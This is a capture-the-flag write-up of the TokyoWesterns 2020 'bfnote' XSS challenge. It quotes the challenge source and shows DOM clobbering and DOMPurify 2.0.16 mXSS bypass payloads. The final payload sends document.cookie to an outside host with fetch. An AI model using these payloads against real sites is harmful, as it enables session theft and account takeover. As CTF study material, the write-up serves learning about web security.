TokyoWesterns 2020 is over and was awesome.
Many amazing challenges of all kind, in this write up I will explain how we solved "bfnote", a well-written web challenge.
Spoiler - it was not the intended solution ;)

# BFNOTE

### Problem

Share your best Brainf*ck code at [bfnote](https://bfnote.chal.ctf.westerns.tokyo/)

Browsing the page presents us with a nice <textarea> and a submit button.
After posting a note we are being redirected to the page that presentes the note itself with a nice "report" button.
An XSS challenge with a Brainf*ck twist, that should be fun . . .

We quickly check the sources of these pages, giving us a little more information about what's going on...

1. /js/bf.js
2. /index.php?source

---

### <u>/js/bf.js</u>

---

A neat Javascript that is responsible of decoding and interpreting the Brainf*ck note.

```javascript
let program, pc, buf, p;
let statusCode = 0; // 0: not running, 1: running, 2: exit successfully, 3: exit with an error
let output = '';
let steps = 0;
const maxSteps = 1000000;

function checkStep() {
  steps++;
  if (steps > maxSteps) {
    throw new Error('maximum steps exceeded')
  }
}

function pinc() {
  p++;
}

function pdec() {
  p--;
}

function inc() {
  buf[p]++;
}

function dec() {
  buf[p]--;
}

function putc() {
  output += String.fromCharCode(buf[p]);
}

function getc() {
  console.err('not implemented');
}

function lbegin() {
  if (buf[p] === 0) {
    let i = pc+1;
    let depth = 1;
    while (i < program.length) {
      if (program[i] === '[') {
        depth++;
      }
      if (program[i] === ']') {
        depth--;
        if (depth === 0) {
          break;
        }
      }

      i++;
      checkStep();
    }

    if (depth === 0) {
      pc = i;
    }
    else {
      throw new Error('parenthesis mismatch')
    }
  }
}

function lend() {
  if (buf[p] !== 0) {
    let i = pc-1;
    let depth = 1;
    while (0 <= i) {
      if (program[i] === ']') {
        depth++;
      }
      if (program[i] === '[') {
        depth--;
        if (depth === 0) {
          break;
        }
      }

      i--;
      checkStep();
    }

    if (depth === 0) {
      pc = i;
    }
    else {
      throw new Error('parenthesis mismatch')
    }
  }
}

function writeOutput() {
  if (statusCode !== 3) {
    if (CONFIG.unsafeRender) {
      document.getElementById('output').innerHTML = output;
    } else {
      document.getElementById('output').innerText = output;
    }
  }
}

function initProgram() {
  // load program
  program = document.getElementById('program').innerText;
  document.getElementById('program').innerHTML = DOMPurify.sanitize(program).toString();

  // initialize
  pc = 0;
  buf = new Uint8Array(30000);
  p = 0;

  statusCode = 0;
}

function runProgram() {
  statusCode = 1;
  try {
    while (pc < program.length) {
      switch (program[pc]) {
        case '>':
          pinc();
          break;
        case '<':
          pdec();
          break;
        case '+':
          inc();
          break;
        case '-':
          dec();
          break;
        case '.':
          putc();
          break;
        case ',':
          getc(); // not implemented
          break;
        case '[':
          lbegin();
          break;
        case ']':
          lend();
          break;
        case '=':
          console.log('=)');
          break;
        case '/':
          console.log(':/');
          break;
        case ' ':
          break;
        default:
          throw new Error(`invalid op: ${program[pc]}`)
      }
  
      pc++;
      checkStep();
    }

    CONFIG = window.CONFIG || {
      unsafeRender: false
    };

    statusCode = 2;
  }
  catch {
    statusCode = 3;
    return;
  }
  // no xss please
  output = output.replaceAll('<', '&lt;').replaceAll('>', '&gt;')
  writeOutput();
}

window.addEventListener('DOMContentLoaded', function() {
  initProgram();
  runProgram();
});
```

A few things we thought are worth mentioning:

- initProgram takes our (escaped) note (using `innerText` thus making it unescaped) and passes it through `DOMPrufiy.sanitize`, which **should** make it impossible to inject any malicious tag that results in javascript execution.
- If runProgram catches an exception while parsing the note - it **will not** write the output to the page.
- Before calling `writeOutput()`, every `<, >` will be escaped.
- if window.CONFIG is present, and it's unsafeRender member **evaluates to true** - the output will be appended to the page using `innerHTML` instead of `innerText`.
  First thing that comes to mind is obviously - **`Dom Clobbering Attack`**.

I will not go over the rules of Brainf\*ck, but I will note that this javascript interpreter will throw an exception if an illegel Brainf\*ck character is in the note, **unless** it is inside a Brainf\*ck loop (surrounded by `[]`).

To make things easier, we wrote a little Python script that encodes a given string as a Brainf\*ck script:

```python
def encode(string):
	p = 0
	output = ''
	for i in string:
		output += p * "-"
		output += ord(i) * "+" + "."
		p = ord(i)
	return output
```

That was the easiest way doing it, but hardly the most efficient way ;)

---

### /<u>index.php</u>

---

```php
<?php
require 'config.php';

header('X-Frame-Options: DENY');

$action = $_SERVER['REQUEST_METHOD'];

$db = new SQLite3('/tmp/db.sqlite3');
$db->exec('create table if not exists notes (id text, content text)');

if ($action === 'POST') {
  $content = $_POST['content'];
  $id = bin2hex(random_bytes(8));

  $content = preg_replace('/[^a-zA-Z0-9<>\[\]+-.,=\/\n\ ]/', '', $content);
  $content = str_replace('<', '&lt;', $content);
  $content = str_replace('>', '&gt;', $content);

  $stmt = $db->prepare('insert into notes values (:id, :content)');
  $stmt->bindValue(':id', $id, SQLITE3_TEXT);
  $stmt->bindValue(':content', $content, SQLITE3_TEXT);
  $stmt->execute();

  header("Location: /?id=${id}");
} else if ($action === 'GET') {
  if (isset($_GET['source'])) {
    highlight_file(__FILE__);
    exit();
  }

  if (!empty($_GET['id'])) {
    $id = $_GET['id'];
  
    $stmt = $db->prepare('select content from notes where id=:id');
    $stmt->bindValue(':id', $id, SQLITE3_TEXT);
    $res = $stmt->execute()->fetchArray(SQLITE3_ASSOC);

    if (empty($res)) {
      header('Location: /');
    }
  
    $content = $res['content'];
  }
}
?>
<!doctype html>
<html>
  <head>
    <title>bfnote</title>
<?php
  if (!empty($_GET['id'])) {
?>
    <script src="/js/bf.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/dompurify/2.0.16/purify.min.js"></script>
    <script src="https://www.google.com/recaptcha/api.js"></script>
<?php
  }
?>
  </head>
  <body>
<?php
  if (empty($_GET['id'])) {
?>
    <!-- <a href="/?source">source</a> -->
    <form action="." method="post">
      <textarea name="content"></textarea>
      <input type="submit" value="share!"></input>
    </form>
<?php
  } else {
?>
    <script>
      function onSubmit(token) {
        fetch(`/report.php`, {
          method: 'post',
          headers: {
            'Content-Type': 'application/x-www-form-urlencoded',
          },
          body: `id=<?=$id?>&token=${token}`,
        }).then(r => r.json()).then(d => {
          if (d['success']) {
            alert('successfully shared');
          }
          else {
            alert(`error: ${d['msg']}`);
          }
        })
      }
    </script>
    <div id="program"><?=$content?></div>
    <div id="output"></div>
    <form id="share">
      <button class="g-recaptcha" data-sitekey="<?=$SITE_KEY?>" data-callback="onSubmit">report</button>
    </form>
<?php
  }
?>
  </body>
</html> 
```

Going over the sources, it was clear that SQLi was not the way to go for this one.
That's nice, we understand a a little bit more about what's going on.
After inspecting this file, a few leads came to mind that I thought should be mentioned here.

- `/js/bf.js` is loaded **before** `purify.min.js` creating a possible undefined behavior.
- There is no `exit()` after setting the `Location` header, the body is sent along with the redirect response.
  We also noticed that there is a Javascript injection in the response if we set `?id` to a malicious payload.
  This is unfortunately not exploitable as the browser does not render the response's body if a `302` status is sent from the server.
- Using HPP, we can set `content` to an array, causing a weird behavior which is also not exploitable.

---

## Mutating HTML

Pretty quick we managed to get the `DOM Clobbering` working so we can trigger the `innerHTML` flow.

```html
<form id="CONFIG"><input type="text" id="unsafeRender"></input></form>
```

The main problem now is `DOMPurify.sanitize`, it pretty much prevents us from doing anything other than that clobbering attack...

Quick search about `DOMPurify` vulnerabilities and exploits brings up this article:

- https://research.securitum.com/dompurify-bypass-using-mxss/

This is a very interesting idea, trying the suggested payload gives us something interesting:

```html
<!-- payload -->
<svg></p><style><a id="</style><img src=1 onerror=alert(1)>">

<!-- DOMPurify.sanitize's output -->
<div id="program">
    <svg></svg>
    <p></p>
    <style><a id=</style>
    <img src="1">
    &gt;
</div>
```

Sadly, not XSS for us **BUT** there is a new <style> element in the page now! Trying to simply post a <style></style> note results in an empty output from `sanitize`, so, is it interesting? Consider the next payload:

```html
<svg></p><style id=output><a id="</style><img src=1 onerror=alert(1)>">
```

Posting this payload will result in a new <style> element with the `id` "output"!
The first slightly interesting thing we managed to get - **CSS Injection**

```html
[<svg></p><style id=output><a id="</style><img src=1 onerror=alert(1)>">]
```

Followed by the output of:

```python
print encode("html{background-color: blue}")
```

Nice, if only the flag was an attribute of an element on the page, we could leak it!

## The solution

At this point, we decided to look a little more into `DOMPurify`, visiting the project's Git page!
Interestingly enough, `bfnote` uses `/dompurify/2.0.16/purify.min.js` and the official git page lists **`2.0.17`** as the Latest release!

Let's have a look at the changelog!
https://github.com/cure53/DOMPurify/compare/2.0.16...2.0.17

Specifically:
https://github.com/cure53/DOMPurify/compare/2.0.16...2.0.17#diff-f44bc3a1bfaa31000b8f4f1359dba82a

Hmm... seems like the library is not perfect just yet, and that the version used in this challenge is still vulnerable to some mXSS!
Finally, we craft a neat payload that successfully appends a tag with malicious attributes!

```html
<math><mtext><table><mglyph><style><div><img src=x onerror=tttt>CLICKME</div>
<!-- DOMPurify.sanitize's output -->
<div id="program">
    <math>
        <mtext>
            <mglyph>
                <style></style>
            </mglyph>
            <div>
                <img src="x" onerror="tttt">CLICKME
            </div>
            <table></table>
    </mtext>
    </math>
</div>
```

Quickly checking the browser's console: `Uncaught ReferenceError: tttt is not defined`
Wohoo! From this point it was simply putting it all together to get it over the line:

```html
[<math><mtext><table><mglyph><style><div><img src=x onerror=share.outerHTML+=window.output.innerText>CLICKME</div>][<form id="CONFIG"><input type="text" id="unsafeRender"></input></form>]
```

Followed by the output of:

```python
print encode("<img src=x onerror='fetch(\"magnumctf.com/\" + btoa(document.cookie))'>")
```

And there you have it: **`flag=TWCTF{reCAPTCHA_Oriented_Programming_with_XSS!}`**
reCaptcha what? HUH? oops...
